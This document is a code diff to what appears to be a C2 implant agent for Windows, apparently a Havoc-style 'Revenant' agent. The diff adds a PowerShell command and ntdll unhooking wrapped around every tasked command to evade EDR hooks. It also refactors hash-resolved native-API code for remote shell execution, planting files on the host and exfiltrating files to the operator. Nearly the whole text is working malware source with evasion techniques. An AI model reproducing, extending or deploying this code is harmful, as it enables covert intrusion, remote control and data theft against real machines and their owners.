@@ -1,6 +1,8 @@
 #include "Asm.h"
+#include "Dbg.h"
 #include "Defs.h"
 #include "Core.h"
+#include "Poly.h"
 #include "Config.h"
 #include "Package.h"
 #include "Command.h"
@@ -8,12 +10,18 @@
 #include "Obfuscation.h"
 #include "Utilities.h"
 
+
 #include <tchar.h>
 
-#define RVNT_COMMAND_LENGTH 5
+#define RVNT_COMMAND_LENGTH 6
+
+// TODO: ADD COMMANDS
+// TODO: Clean code base, consistent naming
+// TODO: Make typing more consistent
 
 RVNT_COMMAND Commands[RVNT_COMMAND_LENGTH] = {
         { .ID = COMMAND_SHELL,            .Function = CommandShell },
+        { .ID = COMMAND_PWSH,             .Function = CommandShell },
         { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
         { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
         { .ID = COMMAND_EXIT,             .Function = CommandExit },
@@ -25,24 +33,31 @@ VOID CommandDispatcher() {
     PVOID    DataBuffer  = NULL;
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand;
+#if CONFIG_UNHOOK == TRUE
+#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
+    PVOID p_ntdll = get_ntdll_64();
+#else
+    PVOID p_ntdll = get_ntdll_32();
+#endif //CONFIG_ARCH
+    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) p_ntdll;
+    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (p_ntdll + pDosHdr->e_lfanew);
+    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
+
+    SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
+    // allocate local buffer to hold temporary copy of ntdll from remote process
+    LPVOID pCacheRestore = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
+    LPVOID pCacheClean = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
+
+    mem_cpy(pCacheRestore, p_ntdll, ntdll_size);
+#endif //unhook
 
     do {
         if(!Instance.Session.Connected) {
-
-
-//--------------------------------
-#if CONFIG_OBFUSCATION
-            unsigned char s_xk[] = S_XK;
-            unsigned char s_string[] = S_INSTANCE_NOT_CONNECTED;
-            // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
-#else
-            // _tprintf("instance not connected!\n");
-#endif
-//--------------------------------
-
+            // if there's no connection, return out of here
             return;
         }
 
+        // sleep
         Sleep( Instance.Config.Sleeping * 1000 );
 
         Package = PackageCreate( COMMAND_GET_JOB );
@@ -61,7 +76,18 @@ VOID CommandDispatcher() {
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < RVNT_COMMAND_LENGTH; FunctionCounter++ ) {
                         if ( Commands[FunctionCounter].ID == TaskCommand) {
+
+                            // unhook
+#if CONFIG_UNHOOK
+                            HookingManager(TRUE, pCacheClean, p_ntdll, ntdll_size);
+#endif
+                            // execute command
                             Commands[FunctionCounter].Function(&Parser);
+
+                            // rehook
+#if CONFIG_UNHOOK
+                            HookingManager(FALSE, pCacheRestore, p_ntdll, ntdll_size);
+#endif
                             FoundCommand = TRUE;
                             break;
                         }
@@ -69,29 +95,13 @@ VOID CommandDispatcher() {
 
 
                     if ( ! FoundCommand ) {
+                        // Command not found
 
-//--------------------------------
-#if CONFIG_OBFUSCATION
-                        unsigned char s_xk[] = S_XK;
-                        unsigned char s_string[] = S_COMMAND_NOT_FOUND;
-                        // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
-#else
-                        // _tprintf("command not found\n");
-#endif
-//--------------------------------
 
                     }
                 } else {
+                    // No Job
 
-//--------------------------------
-#if CONFIG_OBFUSCATION
-                    unsigned char s_xk[] = S_XK;
-                    unsigned char s_string[] = S_IS_COMMAND_NO_JOB;
-                    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
-#else
-                    // _tprintf("Is COMMAND_NO_JOB\n");
-#endif
-//--------------------------------
 
                 }
             } while ( Parser.Length > 4 );
@@ -102,16 +112,7 @@ VOID CommandDispatcher() {
 
             ParserDestroy(&Parser);
         } else {
-
-//--------------------------------
-#if CONFIG_OBFUSCATION
-            unsigned char s_xk[] = S_XK;
-            unsigned char s_string[] = S_TRANSPORT_FAILED;
-            // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
-#else
-            // _tprintf("Transport: Failed\n");
-#endif
-//--------------------------------
+            // Connection failed
 
             break;
         }
@@ -124,20 +125,12 @@ VOID CommandDispatcher() {
 VOID CommandShell( PPARSER Parser ){
 
 #if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
-    void *p_ntdll = get_ntdll_64();
+    PVOID p_ntdll = get_ntdll_64();
 #else
-    void *p_ntdll = get_ntdll_32();
+    PVOID p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
-//--------------------------------
-#if CONFIG_OBFUSCATION
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_SHELL;
-    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
-#else
-    // _tprintf("Command::Shell\n");
-#endif
-//---------------------------------
-#if CONFIG_NATIVE
+
+#if CONFIG_NATIVE == TRUE
 
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
@@ -145,6 +138,10 @@ VOID CommandShell( PPARSER Parser ){
     HANDLE  hStdInPipeWrite  = NULL;
     HANDLE  hStdOutPipeRead  = NULL;
     HANDLE  hStdOutPipeWrite = NULL;
+
+    PPS_ATTRIBUTE_LIST attrib_list = NULL;
+    PSECTION_IMAGE_INFORMATION sec_img_info = NULL;
+    PCLIENT_ID client_id = NULL;
 
     SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
 
@@ -158,27 +155,24 @@ VOID CommandShell( PPARSER Parser ){
 
     UNICODE_STRING nt_image_path;
     UNICODE_STRING nt_args;
-    UNICODE_STRING nt_command_line;
 
-    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
-    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
 
     // hardcoded test string
     //g_rtl_init_unicode_string(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");
 
-
     // split command and args
-    char command_str[MAX_PATH];
-    char arg_str[MAX_PATH];
+    CHAR command_str[MAX_PATH];
+    CHAR arg_str[MAX_PATH];
 
     // copy command line (cmd.exe /c XXXXX)
     mem_cpy(command_str,Command,Length);
 
     // split command line
-    char ** command_array = split_first_space(command_str);
+    PCHAR * command_array = split_first_space(command_str);
 
     // get command file path
-    char * cmd_file = str_dup(command_array[0]);
+    PCHAR cmd_file = str_dup(command_array[0]);
 
     // get args
     mem_cpy(arg_str,command_array[1],str_len(command_array[1]));
@@ -191,22 +185,25 @@ VOID CommandShell( PPARSER Parser ){
     PWSTR wide_command = str_to_wide(cmd_file);
     PWSTR wide_args = str_to_wide(arg_str);
 
+
     // make the command line
-    PWCHAR command_line = wide_concat(wide_concat(wide_command, L" "),wide_args);
+    PWCHAR command_w_space = wide_concat(wide_command, L" ");
+    PWCHAR command_line = wide_concat(command_w_space,wide_args);
+    LocalFree(*(PVOID *)command_w_space);
 
     // unicode str
-    g_rtl_init_unicode_string(&nt_image_path, wide_command);
-    g_rtl_init_unicode_string(&nt_args, wide_args);
-    //g_rtl_init_unicode_string(&nt_command_line, command_line);
+    p_RtlInitUnicodeString(&nt_image_path, wide_command);
+    p_RtlInitUnicodeString(&nt_args, wide_args);
 
     // _tprintf("Command Line:%ls\n", command_line);
 
     PRTL_USER_PROCESS_PARAMETERS proc_params = { 0 };
 
     // create process params struct
-    void *p_rtl_create_process_parameters_ex = get_proc_address_by_hash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
-    RtlCreateProcessParametersEx_t g_rtl_create_process_parameters_ex = (RtlCreateProcessParametersEx_t) p_rtl_create_process_parameters_ex;
-    g_rtl_create_process_parameters_ex(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01);
+    RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
+    check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path,
+                                               NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
+                                               0x01) == 0, "RtlCreateProcessParametersEx Failed!");
 
     // create info struct
     PS_CREATE_INFO create_info = { 0 };
@@ -227,42 +224,53 @@ VOID CommandShell( PPARSER Parser ){
     proc_params->StandardInput   = handle_array[0];
 
     // allocate process heap
-    void *p_rtl_allocate_heap = get_proc_address_by_hash(p_ntdll, RtlAllocateHeap_CRC32B);
-    RtlAllocateHeap_t g_rtl_allocate_heap = (RtlAllocateHeap_t) p_rtl_allocate_heap;
+    RtlAllocateHeap_t p_RtlAllocateHeap = (RtlAllocateHeap_t) GetProcAddressByHash(p_ntdll, RtlAllocateHeap_CRC32B);
 
     // get heaps
-    void *p_rtl_get_process_heaps = get_proc_address_by_hash(p_ntdll, RtlGetProcessHeaps_CRC32B);
-    RtlGetProcessHeaps_t g_rtl_get_process_heaps = (RtlGetProcessHeaps_t) p_rtl_get_process_heaps;
+    // RtlGetProcessHeaps_t p_RtlGetProcessHeaps = (RtlGetProcessHeaps_t) GetProcAddressByHash(p_ntdll, RtlGetProcessHeaps_CRC32B);
 
     // make attributes
-    OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
-    PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
-    PCLIENT_ID client_id = (PCLIENT_ID)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
-    PPS_ATTRIBUTE_LIST attrib_list = (PS_ATTRIBUTE_LIST *)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
-    PSECTION_IMAGE_INFORMATION sec_img_info = (PSECTION_IMAGE_INFORMATION)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
+    // OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
+    // PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
+    client_id = (PCLIENT_ID) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
+    attrib_list = (PS_ATTRIBUTE_LIST *) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+    sec_img_info = (PSECTION_IMAGE_INFORMATION) p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
 
     attrib_list->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - (sizeof(PS_ATTRIBUTE));
     attrib_list->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
     attrib_list->Attributes[0].Size = nt_image_path.Length;
     attrib_list->Attributes[0].Value = (ULONG_PTR)nt_image_path.Buffer;
 
-    NTSTATUS status;
     HANDLE h_proc, h_thread = NULL;
-    void *p_nt_create_user_process = get_proc_address_by_hash(p_ntdll, NtCreateUserProcess_CRC32B);
-    NtCreateUserProcess_t g_nt_create_user_process = (NtCreateUserProcess_t) p_nt_create_user_process;
-    if((status = g_nt_create_user_process(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list)) != 0x0) {
-        // _tprintf("PROCESS CREATION FAILED!\n");
-        // _tprintf("STATUS:%08x\n", status);
-    }
-    void *p_rtl_free_heap = get_proc_address_by_hash(p_ntdll, RtlFreeHeap_CRC32B);
-    RtlFreeHeap_t g_rtl_free_heap = (RtlFreeHeap_t) p_rtl_free_heap;
-    g_rtl_free_heap(RtlProcessHeap(), 0, attrib_list);
-    g_rtl_free_heap(RtlProcessHeap(), 0, sec_img_info);
-    g_rtl_free_heap(RtlProcessHeap(), 0, client_id);
+    NtCreateUserProcess_t p_NtCreateUserProcess = (NtCreateUserProcess_t) GetProcAddressByHash(p_ntdll, NtCreateUserProcess_CRC32B);
 
-    void *p_rtl_destroy_process_parameters = get_proc_address_by_hash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
-    RtlDestroyProcessParameters_t g_rtl_destroy_process_parameters = (RtlDestroyProcessParameters_t) p_rtl_destroy_process_parameters;
-    g_rtl_destroy_process_parameters(proc_params);
+    check_debug(p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL,
+                                      PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info,
+                                      attrib_list) == 0, "NtCreateUserProcess Failed!");
+
+    RtlFreeHeap_t p_RtlFreeHeap = (RtlFreeHeap_t) GetProcAddressByHash(p_ntdll, RtlFreeHeap_CRC32B);
+
+    LEAVE:
+    if(attrib_list != NULL){
+        p_RtlFreeHeap(RtlProcessHeap(), 0, attrib_list);
+    }
+    if(sec_img_info != NULL){
+        p_RtlFreeHeap(RtlProcessHeap(), 0, sec_img_info);
+    }
+    if(client_id != NULL){
+        p_RtlFreeHeap(RtlProcessHeap(), 0, client_id);
+    }
+
+    LocalFree(*(PVOID *)wide_command);
+    LocalFree(*(PVOID *)wide_args);
+    LocalFree(*(PVOID *)command_array);
+    LocalFree(*(PVOID *)cmd_file);
+    LocalFree(*(PVOID *)command_line);
+
+    RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
+
+    p_RtlDestroyProcessParameters(proc_params);
+
 
     CloseHandle( hStdOutPipeWrite );
     CloseHandle( hStdInPipeRead );
@@ -317,16 +325,17 @@ VOID CommandShell( PPARSER Parser ){
 VOID CommandUpload( PPARSER Parser ) {
 
 //--------------------------------
+
+#if CONFIG_NATIVE == TRUE
+
 #if CONFIG_ARCH == 64
-    void *p_ntdll = get_ntdll_64();
+    PVOID p_ntdll = get_ntdll_64();
 #else
-    void *p_ntdll = get_ntdll_32();
+    PVOID p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
 
-
-#if CONFIG_NATIVE
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_UPLOAD;
+    // UCHAR s_xk[] = S_XK;
+    // UCHAR s_string[] = S_COMMAND_UPLOAD;
     // _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));
 
     PPACKAGE Package = PackageCreate(COMMAND_UPLOAD);
@@ -344,7 +353,7 @@ VOID CommandUpload( PPARSER Parser ) {
 
     NTSTATUS status;
     UNICODE_STRING file_path;
-    char file_name[MAX_PATH] = { 0 };
+    CHAR file_name[MAX_PATH] = { 0 };
     mem_cpy(file_name,FileName, NameSize - 1);
     NameSize = NameSize - 1;
 
@@ -357,30 +366,26 @@ VOID CommandUpload( PPARSER Parser ) {
     // _tprintf("Normalized: %s\n", file_name);
 
     WCHAR *w_file_path = str_to_wide(file_name);
-    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
-    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
-    g_rtl_init_unicode_string(&file_path, w_file_path);
+
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
+    p_RtlInitUnicodeString(&file_path, w_file_path);
+
+
     OBJECT_ATTRIBUTES obj_attrs;
     IO_STATUS_BLOCK io_status_block;
 
 
     InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
-    void *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32B);
-    NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;
-    if ((status = g_nt_create_file(&hFile, FILE_GENERIC_WRITE, &obj_attrs, &io_status_block, NULL,
-                                   FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
-                                   FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
-                                   0)) != 0x0) {
-        //_tprintf("[*] NtCreateFile: Failed[0x%lx]\n", status);
-        goto Cleanup;
-    }
+    NtCreateFile_t p_NtCreateFile = GetProcAddressByHash(p_ntdll, NtCreateFile_CRC32B);
 
-    void *p_nt_write_file = get_proc_address_by_hash(p_ntdll, NtWriteFile_CRC32B);
-    NtWriteFile_t g_nt_write_file = (NtWriteFile_t) p_nt_write_file;
-    if ((status = g_nt_write_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize-1, 0, 0)) != 0x0) {
-        //_tprintf("[*] NtWriteFile: Failed[0x%lx]\n", status);
-        goto Cleanup;
-    }
+    check_debug(p_NtCreateFile(&hFile, FILE_GENERIC_WRITE, &obj_attrs, &io_status_block, NULL,
+                               FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
+                               FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
+                               0) == 0, "NtCreateFile Failed!");
+
+    NtWriteFile_t p_NtWriteFile = GetProcAddressByHash(p_ntdll, NtWriteFile_CRC32B);
+    check_debug(p_NtWriteFile(hFile, NULL, NULL, NULL, &io_status_block,
+                              Content, FileSize-1, 0, 0) == 0, "NtWriteFile Failed!");
 
     Written = io_status_block.Information;
 
@@ -388,7 +393,8 @@ VOID CommandUpload( PPARSER Parser ) {
     PackageAddBytes(Package, (PUCHAR) FileName, NameSize);
     PackageTransmit(Package, NULL, NULL);
 
-    Cleanup:
+    LEAVE:
+    LocalFree(w_file_path);
     CloseHandle(hFile);
     hFile = NULL;
 
@@ -410,21 +416,16 @@ VOID CommandUpload( PPARSER Parser ) {
 
     hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
-    if ( hFile == INVALID_HANDLE_VALUE ) {
-        // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
-        goto Cleanup;
-    }
+    check_debug(hFile != INVALID_HANDLE_VALUE, "CreateFileA Failed!");
 
-    if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL)) {
-        // _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
-        goto Cleanup;
-    }
+    check_debug(WriteFile( hFile, Content, FileSize,
+                           &Written, NULL) != 0, "WriteFile Failed!");
 
     PackageAddInt32( Package, FileSize );
     PackageAddBytes( Package, (PUCHAR)FileName, NameSize );
     PackageTransmit( Package, NULL, NULL );
 
-    Cleanup:
+    LEAVE:
     CloseHandle( hFile );
     hFile = NULL;
 #endif // CONFIG_NATIVE
@@ -434,15 +435,15 @@ VOID CommandUpload( PPARSER Parser ) {
 
 VOID CommandDownload( PPARSER Parser ) {
 #if CONFIG_ARCH == 64
-    void *p_ntdll = get_ntdll_64();
+    PVOID p_ntdll = get_ntdll_64();
 #else
-    void *p_ntdll = get_ntdll_32();
+    PVOID p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
 
 //--------------------------------
-#if CONFIG_NATIVE
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_DOWNLOAD;
+#if CONFIG_NATIVE == TRUE
+    // UCHAR s_xk[] = S_XK;
+    // UCHAR s_string[] = S_COMMAND_DOWNLOAD;
     // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
@@ -462,9 +463,9 @@ VOID CommandDownload( PPARSER Parser ) {
      */
     NTSTATUS status;
     UNICODE_STRING file_path;
-    char file_name[MAX_PATH] = { 0 };
+    CHAR file_name[MAX_PATH] = { 0 };
     mem_cpy(file_name,FileName, NameSize - 2);
-    NameSize = strlen(file_name);
+    NameSize = str_len(file_name);
 
     // FIX THIS STRING
     // _tprintf("Before: %s\n", file_name);
@@ -476,40 +477,33 @@ VOID CommandDownload( PPARSER Parser ) {
 
 
     WCHAR *w_file_path = str_to_wide(file_name);
-    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
-    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
-    g_rtl_init_unicode_string(&file_path, w_file_path);
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
+    p_RtlInitUnicodeString(&file_path, w_file_path);
+    LocalFree(w_file_path);
     OBJECT_ATTRIBUTES obj_attrs;
     IO_STATUS_BLOCK io_status_block;
 
     InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
 
 
-    void *p_nt_open_file = get_proc_address_by_hash(p_ntdll, NtOpenFile_CRC32B);
-    NtOpenFile_t g_nt_open_file = (NtOpenFile_t) p_nt_open_file;
-    if((status = g_nt_open_file(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT)) != 0){
-        //_tprintf("NtOpenFile: 0x%lx\n", status);
-        goto CleanupDownload;
-    }
+    NtOpenFile_t p_NtOpenFile = GetProcAddressByHash(p_ntdll, NtOpenFile_CRC32B);
+
+    check_debug(p_NtOpenFile(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ,
+                             FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) == 0, "NtOpenFile Failed!");
 
     FILE_STANDARD_INFORMATION file_standard_info;
-    void *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32B);
-    NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;
-    if((status = g_nt_query_information_file(hFile, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0) {
-        // _tprintf("NtQueryInformationFile failed with status: 0x%lx\n", status);
-        goto CleanupDownload;
-    }
+    NtQueryInformationFile_t p_NtQueryInformationFile = GetProcAddressByHash(p_ntdll, NtQueryInformationFile_CRC32B);
+    check_debug(p_NtQueryInformationFile(hFile, &io_status_block,
+                                         &file_standard_info, sizeof(FILE_STANDARD_INFORMATION),
+                                         FileStandardInformation) == 0,"NtQueryInformationFile Failed!");
 
     FileSize = file_standard_info.EndOfFile.QuadPart;
     // _tprintf("file_size: %d\n", FileSize);
     Content  = LocalAlloc( LPTR, FileSize );
 
-    void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32B);
-    NtReadFile_t g_nt_read_file = (NtReadFile_t) p_nt_read_file;
-    if((status = g_nt_read_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize, NULL, NULL)) != 0x0) {
-        // _tprintf("NtReadFile failed with status: 0x%lx\n", status);
-        goto CleanupDownload;
-    }
+    NtReadFile_t p_NtReadFile = GetProcAddressByHash(p_ntdll, NtReadFile_CRC32B);
+    check_debug( p_NtReadFile(hFile, NULL, NULL, NULL,
+                              &io_status_block, Content, FileSize, NULL, NULL) == 0, "NtReadFile Failed!");
 
     Read += io_status_block.Information;
 
@@ -537,20 +531,13 @@ VOID CommandDownload( PPARSER Parser ) {
     // _tprintf( "FileName => %s\n", FileName );
 
     hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
-    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
-    {
-        // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
-        goto CleanupDownload;
-    }
+
+    check_debug( !(( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE )), "CreateFileA Failed!" );
 
     FileSize = GetFileSize( hFile, 0 );
     Content  = LocalAlloc( LPTR, FileSize );
 
-    if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
-    {
-        // _tprintf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
-        goto CleanupDownload;
-    }
+    check_debug(ReadFile( hFile, Content, FileSize, &Read, NULL ) != 0, "ReadFile Failed!" );
 
     PackageAddBytes( Package, FileName, NameSize );
     PackageAddBytes( Package, Content,  FileSize );
@@ -558,7 +545,7 @@ VOID CommandDownload( PPARSER Parser ) {
     PackageTransmit( Package, NULL, NULL );
 #endif
 
-    CleanupDownload:
+    LEAVE:
     if ( hFile ){
         CloseHandle( hFile );
         hFile = NULL;
@@ -570,21 +557,9 @@ VOID CommandDownload( PPARSER Parser ) {
         Content = NULL;
     }
 
-
 }
 
 VOID CommandExit( PPARSER Parser ) {
-
-//--------------------------------
-#if CONFIG_OBFUSCATION
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_EXIT;
-    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
-#else
-    // _tprintf( "Command::Exit\n");
-#endif
-//--------------------------------
-
     ExitProcess( 0 );
 }
 
